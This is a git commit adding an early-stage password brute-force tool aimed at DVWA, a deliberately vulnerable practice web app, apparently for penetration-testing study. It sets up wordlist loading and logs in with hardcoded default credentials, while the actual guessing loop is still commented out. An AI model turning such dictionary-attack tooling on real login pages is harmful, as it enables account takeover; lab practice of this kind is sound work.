cb50a43483ceff60b57e4da2e632d4de6820c381
Joel Perron-Langlois <tijoe9@hotmail.com>
2018-06-09 22:36:07 -0400

    With requests_html. Integrated dictionary attack

--- attacks_manager.py
+++ attacks_manager.py
@@ -1,5 +1,51 @@
+import configparser
+import argparse
+from core.session import Session
+from password_attacks.dictionary import dictionary
+
+
+# Arguments parser
+parser = argparse.ArgumentParser(description="Execute attacks against a DVWA server.", formatter_class=argparse.RawTextHelpFormatter)
+parser.add_argument("attacks", type=int, nargs=1, help ="Attack no to perform\n"
+                                                        "1. Password attacks (Default: dictionary)")
+parser.add_argument("-u", "--users", type=str, nargs='+', help="Specify users to try instead of using user dictionaries in the config file. Password attacks only.")
+parser.add_argument("-p", "--passw",  type=str, nargs='+', help="Specify passwords to try instead of using user dictionaries in the config file. Password attacks only.")
+args = parser.parse_args()
+
+# Variables from the config file
+config = configparser.ConfigParser()
+config.read('config.ini')
+base_url = config['server']['url']
+dvwa_creds={
+    'user': config['credentials']['username'],
+    'pass': config['credentials']['password']
+}
+dict_user = config['dictionaries']['users'].split('\n')
+dict_pass = config['dictionaries']['passwords'].split('\n')
+users = []
+passw = []
+
+
+def get_args():
+    if args.attacks[0] is 1:
+        if args.users is not None:
+            users.extend(args.users)
+        if args.passw is not None:
+            passw.extend(args.passw)
+    return args.attacks[0]
+
+def execute_attack(attack_no, session):
+    if attack_no is 1:
+        dictionary.attack(session, dict_user, users, dict_pass, passw)
+    exit(0)
+
+
 def main():
-    print("Hello World!")
+    print("Trying to login...")
+    sess = Session(base_url)
+    sess.login('login.php', dvwa_creds)
+
+    execute_attack(get_args(), sess)
 
 
 if __name__ == "__main__":
--- password_attacks/dictionary/dictionary.py
+++ password_attacks/dictionary/dictionary.py
@@ -1,2 +1,36 @@
-dictionaries = ["/home/joel/OSCP/rockyou.txt"]
+from core.session import Session
+
+
+def attack(session, dict_user, users, dict_pass, passw):
+    usernames=[]
+    passwords=[]
+
+    # If users were given on command line, they have priority over the config file
+    if not users:
+        for file in dict_user:
+            usernames.extend(open(file, "r", errors='replace').readlines())
+    else:
+        usernames.extend(users)
+
+    # If passwords were given on command line, they have priority over the config file
+    if not passw:
+        for file in dict_pass:
+            passwords.extend(open(file, "r", errors='replace').readlines())
+    else:
+        passwords.extend(passw)
+
+    #for u in usernames:
+    #    u = u.rstrip('\n')
+    #    print(u)
+
+    #session.get_sess_infos('vulnerabilities/brute/', session.get_cookies())
+
+    dvwa_creds = {
+        'user': 'admin',
+        'pass': 'password'
+    }
+    print('\n\n\n')
+    session.login('vulnerabilities/brute/', dvwa_creds)
+
+    #print(session.get_session().text)
 
